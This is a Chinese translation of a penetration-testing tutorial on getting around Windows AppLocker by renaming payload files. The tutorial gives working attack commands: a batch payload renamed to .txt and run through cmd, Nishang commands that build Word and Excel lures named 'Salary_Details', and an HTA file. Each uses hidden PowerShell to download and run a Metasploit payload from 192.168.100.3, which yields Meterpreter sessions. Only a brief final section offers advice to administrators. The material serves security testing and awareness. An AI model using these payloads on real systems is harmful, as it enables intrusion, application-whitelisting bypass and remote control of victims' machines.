> 原文链接: https://www.anquanke.com//post/id/86290 


# 【技术分享】AppLocker绕过之文件拓展名


                                阅读量   
                                **94636**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：pentestlab.blog
                                <br>原文地址：[https://pentestlab.blog/2017/06/12/applocker-bypass-file-extensions/](https://pentestlab.blog/2017/06/12/applocker-bypass-file-extensions/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p5.ssl.qhimg.com/t01794f7b5ba17f885e.png)](https://p5.ssl.qhimg.com/t01794f7b5ba17f885e.png)



译者：[牧野之鹰](http://bobao.360.cn/member/contribute?uid=877906634)

预估稿费：100RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



要绕过AppLocker的限制通常是使用受信赖的MS的二进制文件来执行代码或者利用弱路径规则。然而在系统中还有一种可行的方法，系统已经配置了默认规则，而规则是允许用户使用CMD和PowerShell，这时用户可以通过使用具有不同文件扩展名的有效载荷来绕过AppLocker。

可以使用Metasploit Web传递模块来托管将要使用的powershell有效载荷，并从目标中检索传入的连接。

代码如下：

```
exploit/multi/script/web_delivery
```

[![](https://p1.ssl.qhimg.com/t015c96851ca86dbbc7.png)](https://p1.ssl.qhimg.com/t015c96851ca86dbbc7.png)

网络传递模块 – PowerShell payload

默认情况下，直接从CMD执行.bat文件将被阻止。

[![](https://p5.ssl.qhimg.com/t019b9112c49a803706.png)](https://p5.ssl.qhimg.com/t019b9112c49a803706.png)

AppLocker – bat文件上的限制

但是，通过将此文件的扩展名更改为.txt，并从CMD执行相同的有效载荷将返回一个Meterpreter会话。

代码如下：

```
cmd.exe /K &lt; payload.txt
```

[![](https://p5.ssl.qhimg.com/t017044d493af8f6fcd.png)](https://p5.ssl.qhimg.com/t017044d493af8f6fcd.png)

CMD-以txt的方式执行bat文件

Payload.txt:



```
@echo off
Powershell.exe -nop -w hidden -c IEX (new-objectnet.webclient)
.downloadstring('http://192.168.100.3:8080/9Q21wiSds9E0pxi');
```

**PAUSE**

在PowerShell中，可以使用Get-Content cmdlet读取txt文件的内容，Invoke-Expression可以运行payload-powershell.txt文件中包含的命令：

代码如下：

```
IEX (new-objectnet.webclient).Downloadstring
('http://192.168.100.3:8080/9Q21wiSds9E0pxi');
```

[![](https://p1.ssl.qhimg.com/t0147934add8df5c859.png)](https://p1.ssl.qhimg.com/t0147934add8df5c859.png)

PowerShell – 从txt执行有效载荷 

Metasploit侦听器将收到两个Meterpreter会话：

[![](https://p1.ssl.qhimg.com/t01c855eab3b6c88088.png)](https://p1.ssl.qhimg.com/t01c855eab3b6c88088.png)

Web Delivery – 获取Meterpreter会话

**<br>**

**File Extensions**



应允许应用程序（如Microsoft Word和Excel）执行，并且可以作为另一种方法来传递绕过AppLocker的恶意有效载荷。 Nishang PowerShell框架可以用于生成包含特定有效载荷的各种扩展，如：

.DOC

.XLS

.HTA

.LNK

应该注意的是，系统需要安装office，否则nishang将无法生成文件。

代码如下：



```
PS C:nishangClient&gt; Import-Module .Out-Word.ps1
PS C:nishangClient&gt; Import-Module .Out-Excel.ps1
PS C:nishangClient&gt; Out-Word -Payload "powershell.exe -nop -w hidden -c IEX (new-object net.webclient).downloadstring(
'http://192.168.100.3:8080/9Q21wiSds9E0pxi');"
Saved to file C:nishangClientSalary_Details.doc
 
PS C:nishangClient&gt; Out-Excel -Payload "powershell.exe -nop -w hidden -c IEX (new-object net.webclient).downloadstring
('http://192.168.100.3:8080/9Q21wiSds9E0pxi');"
Saved to file C:nishangClientSalary_Details.xls
```

[![](https://p0.ssl.qhimg.com/t0142cc9f736b2b42c1.png)](https://p0.ssl.qhimg.com/t0142cc9f736b2b42c1.png)

Nishang – 嵌有payload的Word和Excel

 Nishang还有两个PowerShell脚本，可以生成嵌有PowerShell payloads 的CHM文件和快捷方式。 需要注意的是，Nishang依赖于HTML Help Workshop应用程序来生成.CHM文件。

[![](https://p2.ssl.qhimg.com/t01c55cd5d3e6e8f4af.png)](https://p2.ssl.qhimg.com/t01c55cd5d3e6e8f4af.png)

Nishang – 编译嵌有payload的HTML文件和快捷方式

以下代码（.HTA文件）可用来绕过AppLocker和其他应用程序白名单软件。

代码如下：



```
&lt;HTML&gt;
&lt;HEAD&gt;
&lt;script language="VBScript"&gt;
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.3:8080/9Q21wiSds9E0pxi')"
&lt;/script&gt;
&lt;/HEAD&gt;
&lt;BODY&gt;
&lt;/BODY&gt;
&lt;/HTML&gt;
```

下面所有类型的文件都可以用来执行远程托管的powershell payload以绕过AppLocker规则。

[![](https://p0.ssl.qhimg.com/t01dd094e26c8ca6679.png)](https://p0.ssl.qhimg.com/t01dd094e26c8ca6679.png)

Nishang – 生成的文件扩展名

<br>



**总结**



如果只是启用了AppLocker 但是并没有阻止CMD和powershell,即使特定类型的文件被阻止了，代码仍然可以执行。如果某些可信赖的应用当前并没有提供特定业务（也就是空在那里没有起作用）的话，系统所有者和IT管理员应该删除他们，应为他们拥有执行代码的能力，这是潜在的危险。除此之外还应该对标准用户禁止CMD，DLL规则也应该开启。

 
